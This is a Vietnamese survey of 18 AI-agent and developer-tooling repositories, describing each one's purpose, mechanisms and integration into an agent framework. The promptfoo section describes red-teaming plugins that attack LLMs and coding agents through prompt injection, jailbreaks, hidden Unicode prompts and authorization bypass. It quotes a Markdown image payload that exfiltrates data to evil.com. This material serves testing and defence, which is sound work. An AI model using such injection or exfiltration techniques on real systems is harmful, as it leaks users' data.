# Bách Khoa Toàn Thư Giải Phẫu 18 Repositories: Bản Chất, Mã Nguồn & Logic Ngầm

Tài liệu này là bản phân tích toàn diện, không lược bỏ của Hội đồng Chuyên gia Kiến trúc đối với **toàn bộ 18 repositories** trong khu vực cách ly (`D:\skills-quarantine\`). Mỗi repository được mổ xẻ theo phương pháp First Principles qua 5 trục tiêu chuẩn:
1. **Thống kê kỹ thuật & Công nghệ lõi** (Ngôn ngữ: JS/TS, Python, Bash; Số lượng files; Module cốt tử).
2. **WHY (Tại sao tác giả làm vậy?)**: Động cơ và triết lý kiến trúc gốc rễ.
3. **WHAT (Giải quyết bài toán gì?)**: Nỗi đau thực tế trong sản xuất phần mềm.
4. **HOW / DEEP LOGIC (Cơ chế kỹ thuật ngầm & Mã nguồn cụ thể)**: Các file script thực thi, AST parser, state machine, hooks, regex, plugins.
5. **INTEGRATION VÀO AGENT-BASE**: Cách mạng hóa quy trình và chuyển hóa thành công cụ chạy được trên hệ thống.

---

## 1. `promptfoo` (OpenAI / Promptfoo)
- **Thống kê**: 5.600 files | 2.878 JS/TS | 101 Python | 845 Markdown | Node.js >= 22.
- **File người dùng đang mở**: `src/server/routes/blobs.ts` (API route lưu trữ và tải blob đa phương tiện cho web viewer eval kết quả).
- **WHY**: Các ứng dụng sử dụng LLM không thể kiểm thử như phần mềm truyền thống (vốn dựa trên deterministic assertions: 1+1=2). Đầu ra của LLM mang tính xác suất (probabilistic). Nếu chỉ dùng mắt người để xem vài câu trả lời mẫu, khi đưa vào sản xuất hệ thống sẽ dính thảm họa: Prompt Injection, rò rỉ dữ liệu khách hàng (PII Leaks), Jailbreak, hoặc suy giảm chất lượng logic âm thầm.
- **WHAT**: Bộ công cụ Red-Teaming (tấn công thử nghiệm bảo mật) và Automated Evals (đánh giá tự động) chuẩn công nghiệp hàng đầu thế giới trong CI/CD.
- **HOW / DEEP LOGIC**:
  - **Hệ thống 67 Plugins Red-Teaming chuyên biệt (`src/redteam/plugins/`)**:
    - `codingAgent`: Tấn công trực tiếp vào các agent lập trình (thử nghiệm xem agent có bị lừa sửa file ngoài phạm vi, ghi đè biến môi trường, hoặc chạy lệnh shell phá hoại không).
    - `asciiSmuggling.ts`: Dò quét kỹ thuật giấu prompt ẩn qua các ký tự Unicode vô hình (Zero-Width Characters).
    - `bfla.ts` & `bola.ts`: Tự động giả lập tấn công vượt quyền hạn đối tượng (Broken Object Level Auth) và quyền hạn chức năng thông qua giao diện hội thoại LLM.
    - `crossSessionLeak.ts`: Kiểm tra xem LLM có nhớ nhầm và làm lộ bí mật của phiên chat trước sang phiên chat sau không.
    - `dataExfil.ts`: Thử nghiệm các kịch bản dụ dỗ model gửi dữ liệu nhạy cảm ra webhook ngoài qua thẻ Markdown `![img](https://evil.com?data=...)`.
    - `excessiveAgency.ts`: Phát hiện khi nào AI tự ý đưa ra quyết định vượt quá thẩm quyền được giao.
  - **Bộ Assertion Matrix đa tầng (`src/assertions/`)**:
    - Chấm điểm bằng Deterministic matchers (regex, contains, equals, JSON schema validation).
    - Chấm điểm bằng Model-Graded Metrics: Sử dụng một LLM độc lập (LLM-as-a-Judge) làm trọng tài chấm điểm theo barem rubric 1–5 điểm.
    - Chấm điểm ngữ nghĩa (Cosine Similarity qua vector embeddings).
  - **Kiến trúc Server cục bộ (`src/server/`)**:
    - Sử dụng SQLite / Drizzle ORM lưu trữ lịch sử kiểm thử, cung cấp Web UI xem bảng so sánh ma trận trực quan (Claude vs GPT vs Gemini).
- **INTEGRATION VÀO AGENT-BASE**:
  - Tích hợp các bài test Red-team vào vai trò `ai-eng` và `security`.
  - Thiết lập kịch bản Assertion Matrix để đánh giá tự động chất lượng output của các agent trước khi merge code.

---

## 2. `ui-ux-pro-max-skill` (Claudekit / NextLevelBuilder)
- **Thống kê**: 714 files | 50 JS/TS | 103 Python | 145 Markdown | 13 SKILL.md.
- **WHY**: AI sinh giao diện luôn mắc "bệnh thẩm mỹ bot": tự bịa màu hex chói lọi, dùng gradient tím/hồng sến súa, dùng emoji làm icon, thiếu trạng thái hover/focus, vỡ layout trên mobile.
- **WHAT**: Cung cấp một bộ máy suy luận hệ thống thiết kế hoàn chỉnh và tự động hóa biên dịch Design Tokens từ JSON sang CSS/Tailwind.
- **HOW / DEEP LOGIC**:
  - **Design Suite gồm 7 sub-skills**:
    1. `ui-ux-pro-max`: 192 reasoning rules (`ui-reasoning.csv`), 79 UI styles (`styles.csv`), 74 font Google Fonts (`typography.csv`).
    2. `design-system`: Kịch bản Node.js `generate-tokens.cjs` đọc `tokens.json` 3 tầng (*Primitive ➔ Semantic ➔ Component*), tự giải quyết biến lồng nhau `{primitive.color.blue.600}` thành CSS variables.
    3. `validate-tokens.cjs`: Linter Node.js quét bắt lỗi hardcoded hex colors và hardcoded pixel values.
    4. `ui-styling`: Công cụ sinh file `tailwind.config.js` chuẩn theme từ tokens (`tailwind_config_gen.py`) và tích hợp shadcn/ui.
    5. `banner-design`: 22 phong cách banner và kích thước chuẩn mạng xã hội (Facebook, TikTok, Twitter, Google Ads).
    6. `brand`: Bộ nhận diện thương hiệu, tone of voice, visual identity.
    7. `slides`: Trình tạo bài thuyết trình HTML tương tác tích hợp Chart.js.
  - **CLI Node.js (`cli/src/index.ts`)**: Quản lý cài đặt, cập nhật phiên bản và đồng bộ assets.
- **INTEGRATION VÀO AGENT-BASE**:
  - Đã cài đặt trọn bộ script Node.js (`generate-tokens.cjs`, `validate-tokens.cjs`) vào `.agents/skills/ui-ux-pro-max/scripts/`.
  - Cập nhật các file tham chiếu chi tiết và gắn với các vai trò `designer`, `dev`, `mobile`, `reviewer`.

---

## 3. `pocock-skills` (Matt Pocock)
- **Thống kê**: 199 files | 1 JS/TS | 116 Markdown | 38 SKILL.md.
- **WHY**: Khi chia việc cho AI theo tầng kỹ thuật (Horizontal Slicing: task DB riêng, task API riêng, task UI riêng), các task phụ thuộc vòng vèo, code xong không chạy thử được, đến khi ghép lại thì gãy. Khi tái cấu trúc diện rộng (Wide Refactors), một thay đổi nhỏ làm gãy hàng trăm file khiến CI đỏ lòm.
- **WHAT**: Chuẩn hóa cách bẻ bài toán thành các phiếu việc nguyên tử có thể kiểm chứng độc lập ngay lập tức.
- **HOW / DEEP LOGIC**:
  - **Tracer-Bullet Vertical Slicing (`to-tickets`)**: Mỗi ticket là một lát cắt dọc hoàn chỉnh: **Giao diện ➔ API ➔ Cơ sở dữ liệu ➔ Test**. Xong ticket nào là bấm chạy được ngay ticket đó.
  - **Expand - Contract Pattern**: Quy tắc refactor diện rộng không bao giờ làm đỏ CI:
    - *Expand*: Tạo cấu trúc mới song song với cấu trúc cũ.
    - *Migrate*: Di chuyển dần từng module gọi sang cấu trúc mới.
    - *Contract*: Xóa bỏ cấu trúc cũ khi không còn ai dùng.
  - **Frontier Dependency (`blocked_by`)**: Đồ thị phụ thuộc cho phép hệ thống chỉ giao cho Agent những task nằm ở "đường biên" (những task không bị chặn), giúp nhiều agent chạy song song mà không dẫm chân nhau.
  - **Frontier Questioning (`grilling`)**: Phỏng vấn người dùng theo Cây Quyết Định (Decision Tree) từng vòng kèm đề xuất cụ thể (`➡️ Đề xuất: ...`).
- **INTEGRATION VÀO AGENT-BASE**:
  - Đã viết lại toàn bộ mẫu phiếu `tasks/_template.md` theo chuẩn Tracer-Bullet & Expand-Contract.

---

## 4. `superpowers` (Jesse Vincent / Obra)
- **WHY**: AI lập trình hay mắc bệnh "nói miệng", tự cho là code đã chạy đúng mà không hề chạy thử lệnh, gỡ lỗi theo linh cảm đoán mò và vá triệu chứng hời hợt.
- **WHAT**: Thiết lập kỷ luật công kỹ nghệ nghiêm ngặt: The Iron Law, TDD hạt mịn 2-5 phút, và gỡ lỗi có hệ thống.
- **HOW / DEEP LOGIC**:
  - **The Iron Law (Quy luật Thép)**: Cấm tuyệt đối tuyên bố một việc đã xong nếu không có proof log thực tế chạy từ terminal với Exit Code 0.
  - **Systematic Debugging 4 Pha**:
    - Pha 1: Tái hiện lỗi tối thiểu bằng 1 test case ĐỎ.
    - Pha 2: Cô lập một biến số duy nhất (Single Variable Isolation).
    - Pha 3: Phân tích nguyên nhân gốc rễ (Root Cause - 5 Whys), cấm vá bề mặt.
    - Pha 4: Sửa dứt điểm & Chống hồi quy (Regression Prevention).
  - **Condition-Based Waiting**: Cấm dùng `sleep()` tĩnh trong async tests, bắt buộc polling trạng thái có timeout.
  - **Subagent Clean-Context**: Giao việc cho subagent với ngữ cảnh cô lập, thu hồi kết quả và review độc lập.
- **INTEGRATION VÀO AGENT-BASE**:
  - Đã nạp thành quy chuẩn bắt buộc trong `agents/roles/dev.md`, `qa.md`, `sre.md`.

---

## 5. `gstack` (Garry Tan / PostHog / YC)
- **Thống kê**: 2.320 files | 1.365 JS/TS | 254 Markdown | 61 SKILL.md.
- **WHY**: Code viết ra chuẩn kỹ thuật nhưng sai mục đích kinh doanh, hoặc phình to phạm vi vô ích (scope creep) vì thiếu lăng kính của nhà sáng lập (Founder Mode / CEO review) và lăng kính vận hành sâu (Eng review).
- **WHAT**: Bộ khung thẩm định kế hoạch đa tầng (CEO Review ➔ Eng Review ➔ Devex Review) kết hợp kiểm thử giao diện tự động bằng trình duyệt Playwright headless.
- **HOW / DEEP LOGIC**:
  - `plan-ceo-review` (1180 dòng): Bắt đầu bằng Scope Gate (dừng chờ người dùng chọn mục tiêu), chạy bài tập "10-Star Product Exercise", đảo ngược giả định (Assumptions Inversion), phân loại 4 chế độ phạm vi (Scope Expansion, Selective Expansion, Hold Scope, Scope Reduction).
  - `plan-eng-review` (759 dòng): Đánh giá tải 10x, nguy cơ khóa bảng DB (Table Lock), sơ đồ tuần tự và ranh giới module.
  - **Playwright Chrome Daemon (`connect-chrome`, `browse`)**: Điều khiển trình duyệt không đầu chạy ngầm, chụp ảnh màn hình, kiểm tra độ mượt mà và layout shifts.
- **INTEGRATION VÀO AGENT-BASE**:
  - Tích hợp vào `agents/roles/product.md`, `architect.md` và `agents/protocols/challenger.md`.

---

## 6. `onlook` (Onlook Inc)
- **Thống kê**: 1.725 files | 1.355 JS/TS | 23 Markdown | Monorepo Bun.
- **WHY**: Lập trình viên AI thường làm hỏng ứng dụng Next.js hiện đại bằng cách đặt `'use client'` bừa bãi lên layout gốc, hoặc khởi tạo state store bằng `useMemo` khiến React GC xóa nhầm cache khi chuyển trang.
- **WHAT**: Thiết lập kỷ luật kiến trúc tuyệt đối cho React Server Components (RSC) và Store Lifecycles.
- **HOW / DEEP LOGIC**:
  - **RSC Boundary**: Mặc định Server Components; chỉ đặt `'use client'` tại leaf components.
  - **Store Lifecycle**: Khởi tạo bằng `useState(() => new Store())` để giữ singleton an toàn; dọn dẹp bằng `useRef` + `setTimeout(..., 0)` để triệt tiêu Navigation Race Conditions.
  - **Token-Efficient Surgical Diffs**: Chỉ thay thế đúng node JSX hoặc hàm logic cần sửa, cấm rewrite nguyên file.
  - **Environment Isolation**: Ràng buộc schema T3 Env, cấm rò rỉ `process.env` xuống client.
- **INTEGRATION VÀO AGENT-BASE**:
  - Đã tích hợp tại Mục 1, 2, 4 trong `agents/knowledge/frontend-patterns.md`.

---

## 7. `open-code-review` (OCR Team)
- **Thống kê**: 1.036 files | 143 JS/TS | 8 Python | 195 Markdown | Go core.
- **WHY**: Review code bằng AI thường sinh ra báo động giả (False Positives), tranh cãi phong cách vụn vặt (bikeshedding) thay vì bắt lỗi bảo mật, race conditions và vi phạm hợp đồng API.
- **WHAT**: Hệ thống CLI thẩm định mã nguồn độc lập với 18 tiêu chí chấm điểm (Rubrics) và mô hình bảo vệ đe dọa (Threat Model).
- **HOW / DEEP LOGIC**:
  - **Threat Model (`ASSURANCE_CASE.md`)**:
    - Ngăn chặn Command Injection qua nội dung diff bằng cờ `--end-of-options`.
    - Ngăn chặn Path Traversal qua bộ lọc `WithinBase()`.
    - Ngăn chặn DNS Rebinding qua Host-Header Allowlist.
  - **Barem 18 Rubrics**: Phân loại theo ma trận rủi ro (Critical, High, Medium, Low), lọc bỏ hoàn toàn nhận xét cảm tính.
- **INTEGRATION VÀO AGENT-BASE**:
  - Nạp vào tiêu chuẩn chấm bài của `agents/roles/reviewer.md`.

---

## 8. `ponytail` (Dietrich Gebert)
- **Thống kê**: 196 files | 47 JS/TS | 6 Python | 57 Markdown | 12 SKILL.md.
- **WHY**: Khi lập trình viên phải đi tắt kỹ thuật để kịp tiến độ (Technical Debt), họ ghi `// TODO` mơ hồ. Lâu dần `// TODO` tích tụ thành bãi rác không ai đo lường, không ai bảo trì.
- **WHAT**: Cú pháp nợ kỹ thuật có cấu trúc (Structured Debt Syntax) có thể phân tích tự động bằng máy.
- **HOW / DEEP LOGIC**:
  - Cú pháp chuẩn: `# debt: <giải pháp đi tắt>, ceiling: <ngưỡng chịu đựng>, upgrade: <mốc thời gian sửa chữa>`.
  - Quản lý sổ nợ tập trung tại `docs/DEBT.md`.
  - Vai trò `debt-hunter` săn lùng các món nợ vượt trần `ceiling`.
- **INTEGRATION VÀO AGENT-BASE**:
  - Đã tích hợp sổ cái `docs/DEBT.md` và vai trò `agents/roles/debt-hunter.md`.

---

## 9. `i-have-adhd` (Ayghri)
- **Thống kê**: 103 files | 6 JS/TS | 11 Python | 31 Markdown | 2 SKILL.md.
- **WHY**: AI hay nói dài dòng làm người dùng mệt mỏi nhận thức (Cognitive Overload), quên mất bước đang làm và không biết hành động tiếp theo là gì.
- **WHAT**: Định hình đầu ra tối ưu cho sự tập trung: dẫn đầu bằng hành động, đánh số các bước, nhắc lại trạng thái sau mỗi lượt.
- **HOW / DEEP LOGIC**:
  - Hook runtime JavaScript `always-on.mjs` chạy ngầm ép định dạng.
  - 10 quy tắc: Dẫn đầu bằng lệnh/file cần sửa, không rào đón, mỗi bước là 1 hành động độc lập, không dùng "sau đó" 2 lần, giọng điệu khách quan (cấm "Uh oh").
- **INTEGRATION VÀO AGENT-BASE**:
  - Đã nạp vào quy chuẩn giao tiếp `agents/protocols/message.md`.

---

## 10. `archify` (TT-A1i)
- **Thống kê**: 549 files | 206 JS/TS | 107 Markdown | 2 SKILL.md.
- **WHY**: Sơ đồ kiến trúc vẽ tay bằng hình ảnh luôn bị lỗi thời ngay khi code thay đổi.
- **WHAT**: Biên dịch kiến trúc phần mềm thành bản đồ tương tác (Interactive System Map) chuẩn xác 100% dựa trên Abstract Syntax Tree (AST) và Typed JSON IR.
- **HOW / DEEP LOGIC**:
  - Agent sinh JSON IR mô tả các node, routes, and roles; Archify biên dịch tự động sang HTML/SVG tương tác có thể tìm kiếm, zoom, lọc luồng dữ liệu (Data Flow Tracing), so sánh Before / Delta / After.
- **INTEGRATION VÀO AGENT-BASE**:
  - Định dạng chuẩn cho `architect` khi vẽ System Map trong `docs/spec/`.

---

## 11. `ruflo` (Ruvnet / Claude Flow)
- **Thống kê**: 5.785 files | 2.633 JS/TS | 1 Python | 1.915 Markdown | 361 SKILL.md.
- **WHY**: Khi điều phối hàng chục Agent làm việc cùng nhau, chúng rất dễ dẫm chân lên nhau, mất trí nhớ phiên làm việc (Session Amnesia), và không thể tự tối ưu qua từng tác vụ.
- **WHAT**: Siêu bộ khung (Agent Meta-Harness) cung cấp trí nhớ học tập tự động (Learning Loop Memory), điều phối đàn (Agent Swarms), và cơ chế router phân bổ nhiệm vụ.
- **HOW / DEEP LOGIC**:
  - Router phân luồng câu lệnh tới đúng Swarm chuyên trách.
  - Bộ nhớ vector và trạng thái liên phiên lưu trữ các mẫu thành công để tái sử dụng.
- **INTEGRATION VÀO AGENT-BASE**:
  - Định hình cơ chế Handoff Notes `docs/notes/inbox/` và vai trò `orchestrator`.

---

## 12. `gods-eye-view` (Bilawal Sidhu)
- **Thống kê**: 1.320 files | 1.143 JS/TS | 35 Markdown | WebGL 3D.
- **WHY**: Cần một cơ chế hiển thị dữ liệu vi mô lẫn vĩ mô theo thời gian thực (Real-time Telemetry) mà không làm sập trình duyệt.
- **WHAT**: Bảng điều khiển viễn thám Trái Đất 3D theo thời gian thực, tích hợp dữ liệu vệ tinh, chuyến bay, tàu biển, camera công cộng.
- **HOW / DEEP LOGIC**:
  - Phân tách độc lập giữa Nguồn cấp dữ liệu (Feeds) và Tầng hiển thị (View Layer) sử dụng WebGL và GPU instancing.
- **INTEGRATION VÀO AGENT-BASE**:
  - Tham khảo kiến trúc mô-đun hóa dữ liệu thời gian thực cho các dashboard viễn thám/analytics.

---

## 13. `ECC` (Affaan-M / Everything Claude Code)
- **Thống kê**: 3.760 files | 647 JS/TS | 146 Python | 2.530 Markdown | 903 SKILL.md.
- **WHY**: Các quyết định kỹ thuật trong dự án lớn bị thất lạc, dẫn đến việc người sau sửa đè lên quyết định của người trước mà không hiểu lý do.
- **WHAT**: Hệ thống quản lý vòng đời Architecture Decision Records (ADR) chuẩn Michael Nygard và bộ cẩm nang thiết kế điện toán đám mây doanh nghiệp.
- **HOW / DEEP LOGIC**:
  - Cấu trúc ADR 4 trạng thái: Proposed ➔ Accepted ➔ Deprecated ➔ Superseded.
  - Bộ blueprints đa đám mây (AWS, Azure, GCP, K8s).
- **INTEGRATION VÀO AGENT-BASE**:
  - Đã tích hợp tại `.agents/skills/architecture-decision-records/` và `docs/adr/`.

---

## 14. `E2B` (E2B Team)
- **Thống kê**: 1.068 files | 330 JS/TS | 537 Python | 22 Markdown.
- **WHY**: Cho phép AI chạy code tự do trên máy tính thực tế có nguy cơ xóa nhầm file, rò rỉ secret hoặc làm hỏng hệ điều hành.
- **WHAT**: Môi trường máy ảo siêu nhẹ (Firecracker MicroVM Sandbox) cho phép AI thực thi code hoàn toàn biệt lập và an toàn trong đám mây.
- **HOW / DEEP LOGIC**:
  - SDK quản lý vòng đời Sandbox (khởi tạo trong 150ms, truyền file, chạy command, thu hồi tài nguyên sau phiên).
- **INTEGRATION VÀO AGENT-BASE**:
  - Định hình rào chắn an toàn `bash: readonly` và danh sách trắng `edit_allow` trong `agents/roles/`.

---

## 15. `markitdown` (Microsoft)
- **Thống kê**: 233 files | 106 Python | 15 Markdown.
- **WHY**: Tài liệu đầu vào của doanh nghiệp phân tán ở DOCX, XLSX, PPTX, PDF. Ném nguyên file nhị phân vào LLM sẽ tốn token và mất cấu trúc bảng.
- **WHAT**: Bộ chuyển đổi tài liệu đa phương thức bóc tách bảng biểu, tiêu đề và OCR hình ảnh thành Markdown sạch.
- **HOW / DEEP LOGIC**:
  - Phân tích cú pháp Office Open XML (Word/Excel/PowerPoint) và PDF AST, trích xuất bảng nguyên vẹn kèm tọa độ ô tính.
- **INTEGRATION VÀO AGENT-BASE**:
  - Đã tích hợp tại `scripts/convert-docs.py` và quy trình `agents/protocols/intake.md`.

---

## 16. `webcmd` (WebCmd Team)
- **Thống kê**: 728 files | 562 JS/TS | 19 Python | 41 Markdown.
- **WHY**: AI cần đọc nội dung từ web nhưng các trang web hiện đại đầy rác quảng cáo, cookie banner, và mã JavaScript phức tạp làm ô nhiễm ngữ cảnh.
- **WHAT**: Công cụ dòng lệnh chuyển hóa website, phiên trình duyệt, và ứng dụng desktop thành ngữ cảnh có cấu trúc cho AI.
- **HOW / DEEP LOGIC**:
  - Headless browser trích xuất cây DOM ngữ nghĩa (Accessibility Tree), lọc bỏ thẻ script/style rác trước khi đưa vào context window.
- **INTEGRATION VÀO AGENT-BASE**:
  - Định hình quy chuẩn thu thập dữ liệu web cho vai trò `researcher`.

---

## 17. `diagram-design` (Cathryn Lavery)
- **Thống kê**: 576 files | 70 Python | 90 Markdown | 1 SKILL.md.
- **WHY**: Biểu đồ ảnh raster (PNG/JPEG) bị vỡ nét và không sửa được; Mermaid thì quá đơn điệu.
- **WHAT**: 41 mẫu sơ đồ kỹ thuật, kiến trúc và quy trình bằng SVG vector thuần (không phụ thuộc thư viện JS ngoài).
- **HOW / DEEP LOGIC**:
  - Dùng Paper Masking chống lem nét, Color Tiers phân cấp và Arrow Hop Markers chống chéo dây.
- **INTEGRATION VÀO AGENT-BASE**:
  - Đã tích hợp tại `.agents/skills/diagram-design/`.

---

## 18. `google-skills` (Google Developer Team)
- **Thống kê**: 839 files | 1 JS/TS | 72 Python | 636 Markdown | 151 SKILL.md.
- **WHY**: Khi tích hợp các dịch vụ đám mây và API Google, AI thường viết code theo tài liệu cũ, thiếu quản lý hạn ngạch (Quota), thiếu xử lý Exponential Backoff và rò rỉ Service Account Keys.
- **WHAT**: Bộ kỹ năng chuẩn mực được kỹ sư Google biên soạn cho các nhà phát triển AI (Cloud APIs, OAuth2, Firebase, Gemini SDK).
- **HOW / DEEP LOGIC**:
  - Triển khai chuẩn mẫu xác thực Least Privilege, quản lý kết nối gRPC và xử lý Retry logic có Jitter.
- **INTEGRATION VÀO AGENT-BASE**:
  - Định hình quy chuẩn hạ tầng cho `devops` và `ai-eng`.
